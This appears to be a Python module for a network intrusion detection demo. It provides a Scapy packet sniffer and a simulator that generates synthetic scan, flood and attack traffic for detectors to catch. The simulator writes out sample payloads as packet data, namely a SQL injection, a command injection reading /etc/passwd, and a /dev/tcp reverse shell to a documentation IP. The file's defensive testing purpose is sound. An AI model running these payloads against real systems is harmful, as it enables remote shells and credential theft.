"""Traffic ingest.

Two modes:
  * `LiveSniffer` - Scapy-based packet capture on a real interface (needs root).
  * `TrafficSimulator` - synthesises realistic + attack traffic so the app is
    demo-ready without special privileges.

Both feed the same async callback with `Packet` objects."""
from __future__ import annotations

import asyncio
import random
import threading
from datetime import datetime, timezone
from typing import Any, Awaitable, Callable

from .packet import Packet

try:
    from scapy.all import sniff, TCP, UDP, ICMP, IP, Raw   # type: ignore
    _SCAPY_OK = True
except Exception:
    _SCAPY_OK = False


PacketHandler = Callable[[Packet], Awaitable[None]]


# --------------------------------------------------------------------------- #
# Live (Scapy) sniffer                                                        #
# --------------------------------------------------------------------------- #
class LiveSniffer:
    def __init__(self, interface: str, bpf_filter: str, handler: PacketHandler) -> None:
        if not _SCAPY_OK:
            raise RuntimeError("Scapy is not available — install with `pip install scapy`.")
        self.interface = interface or None
        self.bpf_filter = bpf_filter or None
        self.handler = handler
        self._thread: threading.Thread | None = None
        self._stop = threading.Event()
        self._loop: asyncio.AbstractEventLoop | None = None

    def _to_packet(self, scapy_pkt) -> Packet | None:
        if IP not in scapy_pkt:
            return None
        ip = scapy_pkt[IP]
        proto = "OTHER"
        src_port = dst_port = 0
        flags = ""
        payload = b""
        if TCP in scapy_pkt:
            proto = "TCP"
            src_port, dst_port = int(scapy_pkt[TCP].sport), int(scapy_pkt[TCP].dport)
            # Scapy exposes TCP flags as a string like "SA" (SYN+ACK). We normalise
            # to a comma-separated list so the signature engine can split consistently.
            flags = ",".join(list(str(scapy_pkt[TCP].flags)))
        elif UDP in scapy_pkt:
            proto = "UDP"
            src_port, dst_port = int(scapy_pkt[UDP].sport), int(scapy_pkt[UDP].dport)
        elif ICMP in scapy_pkt:
            proto = "ICMP"
        if Raw in scapy_pkt:
            payload = bytes(scapy_pkt[Raw].load)
        return Packet(
            ts=datetime.now(timezone.utc),
            protocol=proto,
            src_ip=str(ip.src),
            src_port=src_port,
            dst_ip=str(ip.dst),
            dst_port=dst_port,
            length=int(len(scapy_pkt)),
            flags=flags,
            payload=payload,
        )

    def _on_packet(self, scapy_pkt) -> None:
        pkt = self._to_packet(scapy_pkt)
        if not pkt or not self._loop:
            return
        asyncio.run_coroutine_threadsafe(self.handler(pkt), self._loop)

    def _run(self) -> None:
        sniff(
            iface=self.interface,
            filter=self.bpf_filter,
            prn=self._on_packet,
            store=False,
            stop_filter=lambda _p: self._stop.is_set(),
        )

    def start(self, loop: asyncio.AbstractEventLoop) -> None:
        self._loop = loop
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True, name="nids-sniffer")
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()


# --------------------------------------------------------------------------- #
# Synthetic traffic simulator                                                 #
# --------------------------------------------------------------------------- #
class TrafficSimulator:
    """Emit a steady stream of benign packets directed at the configured
    *defended host* and, on demand, fire attack bursts at the same host so
    the signature + ML engines have something to react to during a demo.

    The defended-host model is intentionally simple: a single ``sensor``
    IP (e.g. ``10.0.0.10``) represents the host being monitored. Benign
    traffic flows *to* that host from a pool of LAN clients; attacks come
    *from* a pool of attacker IPs and also target that host. This makes
    it obvious from the dashboard which machine the NIDS is protecting.
    """

    # Pool of benign LAN clients that talk to the defended host.
    BENIGN_SRC = [f"10.0.0.{i}" for i in range(20, 60)]
    COMMON_PORTS = [80, 443, 53, 22, 3306, 445, 25]

    # Attacker IPs from the RFC 5737 documentation ranges, so the demo never
    # labels a real third-party address as malicious.
    ATTACKERS = ["203.0.113.66", "198.51.100.23", "192.0.2.45"]

    # Attack family taxonomy — exposed via /api/sim/attacks.
    ATTACK_CATALOG: dict[str, dict[str, Any]] = {
        "nmap":          {"label": "Nmap port scan",       "burst": True,
                          "description": "TCP SYN sweep across 14 common service ports."},
        "ssh_brute":     {"label": "SSH brute force",      "burst": True,
                          "description": "12–20 rapid SYNs to port 22 from a single source."},
        "icmp_flood":    {"label": "ICMP flood",           "burst": True,
                          "description": "55–90 ICMP echo packets — denial-of-service signature."},
        "sqli":          {"label": "SQL injection",        "burst": False,
                          "description": "HTTP GET with a classic OR '1'='1 payload."},
        "cmd_inject":    {"label": "Command injection",    "burst": False,
                          "description": "HTTP POST with shell metacharacters in the body."},
        "reverse_shell": {"label": "Reverse shell beacon", "burst": False,
                          "description": "TCP payload containing /bin/sh redirected to /dev/tcp."},
    }

    def __init__(
        self,
        handler: PacketHandler,
        defended_host_ip: str = "10.0.0.10",
        attacks_on_demand_only: bool = True,
        benign_traffic: bool = False,
    ) -> None:
        self.handler = handler
        self.defended_host_ip = defended_host_ip
        self.attacks_on_demand_only = attacks_on_demand_only
        self.benign_traffic = benign_traffic
        self._task: asyncio.Task | None = None
        self._running = False
        # Bookkeeping for the Attack Console: count of manual attacks fired
        # since the simulator started, plus metadata about the last one.
        self.attacks_fired = 0
        self.last_attack_ts: str | None = None
        self.last_attack_kind: str | None = None

    # --- packet factories ---
    def _benign(self) -> Packet:
        """One benign packet *to* the defended host."""
        src = random.choice(self.BENIGN_SRC)
        dst = self.defended_host_ip
        dport = random.choice([80, 443, 53, 22])
        proto = "UDP" if dport == 53 else "TCP"
        return Packet(
            protocol=proto,
            src_ip=src,
            src_port=random.randint(30000, 60000),
            dst_ip=dst,
            dst_port=dport,
            length=random.randint(120, 1200),
            flags="A,P" if proto == "TCP" else "",
            payload=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" if dport == 80 else b"",
        )

    def _nmap_scan(self, attacker: str) -> list[Packet]:
        target = self.defended_host_ip
        pkts = []
        for _ in range(random.randint(25, 40)):
            pkts.append(Packet(
                protocol="TCP",
                src_ip=attacker,
                src_port=random.randint(40000, 60000),
                dst_ip=target,
                dst_port=random.choice([21, 22, 23, 25, 80, 110, 139, 143, 443, 445, 3306, 3389, 5432, 8080]),
                length=60,
                flags="S",
            ))
        return pkts

    def _ssh_brute(self, attacker: str) -> list[Packet]:
        target = self.defended_host_ip
        return [
            Packet(protocol="TCP", src_ip=attacker, src_port=random.randint(40000, 60000),
                   dst_ip=target, dst_port=22, length=80, flags="S")
            for _ in range(random.randint(12, 20))
        ]

    def _icmp_flood(self, attacker: str) -> list[Packet]:
        target = self.defended_host_ip
        return [
            Packet(protocol="ICMP", src_ip=attacker, src_port=0, dst_ip=target, dst_port=0, length=84)
            for _ in range(random.randint(55, 90))
        ]

    def _sqli(self, attacker: str) -> Packet:
        target = self.defended_host_ip
        payload = b"GET /login.php?user=admin' OR '1'='1&pwd=x HTTP/1.1\r\nHost: web\r\n\r\n"
        return Packet(protocol="TCP", src_ip=attacker, src_port=random.randint(40000, 60000),
                      dst_ip=target, dst_port=80, length=len(payload) + 40, flags="A,P", payload=payload)

    def _cmd_inject(self, attacker: str) -> Packet:
        target = self.defended_host_ip
        payload = b"POST /cgi-bin/vuln HTTP/1.1\r\n\r\ncmd=ls; cat /etc/passwd; whoami\n"
        return Packet(protocol="TCP", src_ip=attacker, src_port=random.randint(40000, 60000),
                      dst_ip=target, dst_port=80, length=len(payload) + 40, flags="A,P", payload=payload)

    def _reverse_shell(self, attacker: str) -> Packet:
        target = self.defended_host_ip
        payload = b"/bin/sh -i >& /dev/tcp/203.0.113.66/4444 0>&1"
        return Packet(protocol="TCP", src_ip=attacker, src_port=4444, dst_ip=target,
                      dst_port=random.randint(40000, 60000),
                      length=len(payload) + 40, flags="A,P", payload=payload)

    # --- attack dispatch table ---
    @property
    def _factories(self) -> dict[str, Any]:
        return {
            "nmap":          self._nmap_scan,
            "ssh_brute":     self._ssh_brute,
            "icmp_flood":    self._icmp_flood,
            "sqli":          self._sqli,
            "cmd_inject":    self._cmd_inject,
            "reverse_shell": self._reverse_shell,
        }

    async def fire_attack(self, kind: str, attacker: str | None = None) -> dict[str, Any]:
        """Inject one attack of the given kind through the dispatcher.

        Returns metadata about the burst (attacker IP, target IP, packet
        count, kind) so the API can echo it back to the UI."""
        factories = self._factories
        if kind not in factories:
            raise ValueError(f"Unknown attack kind: {kind!r}")
        attacker = attacker or random.choice(self.ATTACKERS)
        result = factories[kind](attacker)
        packets = result if isinstance(result, list) else [result]
        for p in packets:
            await self.handler(p)

        self.attacks_fired += 1
        self.last_attack_ts = datetime.now(timezone.utc).isoformat()
        self.last_attack_kind = kind
        return {
            "kind":         kind,
            "attacker":     attacker,
            "target":       self.defended_host_ip,
            "packet_count": len(packets),
            "ts":           self.last_attack_ts,
        }

    # --- main loop ---
    async def _loop(self) -> None:
        tick = 0
        all_attacks = list(self._factories.keys())
        while self._running:
            # Benign baseline (opt-in). When disabled, the dispatcher sees
            # exactly zero packets until an attack is fired on demand — so
            # the dashboard's live graph stays flat and the audience sees
            # a clear before/after when you click an attack button.
            if self.benign_traffic:
                for _ in range(random.randint(6, 10)):
                    await self.handler(self._benign())

            # Legacy mode: inject a random attack burst every ~5 s.
            # In on-demand mode this branch is skipped and attacks must be
            # triggered via fire_attack() / the /api/sim/attack endpoint.
            if not self.attacks_on_demand_only and tick % 20 == 0:
                try:
                    await self.fire_attack(random.choice(all_attacks))
                except Exception:
                    pass

            tick += 1
            await asyncio.sleep(0.25)

    def start(self) -> None:
        if self._running:
            return
        self._running = True
        self._task = asyncio.create_task(self._loop())

    async def stop(self) -> None:
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None
